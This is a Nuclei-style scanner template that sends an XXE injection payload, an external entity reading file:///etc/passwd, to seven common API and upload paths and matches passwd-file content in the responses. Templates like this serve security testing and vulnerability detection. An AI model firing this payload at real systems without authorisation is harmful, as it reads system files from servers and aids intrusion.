id: m7-xxe-basic-file-read
info:
  name: M7 - XXE Basic File Read
  author: Sharlix
  severity: critical
  description: XXE injection for /etc/passwd file read
  tags: xxe,file-read,m7hunter
  reference:
    - https://portswigger.net/web-security/xxe

requests:
  - method: POST
    path:
      - "{{BaseURL}}/api"
      - "{{BaseURL}}/api/xml"
      - "{{BaseURL}}/upload"
      - "{{BaseURL}}/parse"
      - "{{BaseURL}}/convert"
      - "{{BaseURL}}/import"
      - "{{BaseURL}}/process"

    body: |
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
      <root><data>&xxe;</data></root>

    headers:
      Content-Type: application/xml

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:x?:\d+:\d+:"
        part: body

      - type: dsl
        dsl:
          - "contains(body, '/bin/bash') || contains(body, '/bin/sh')"
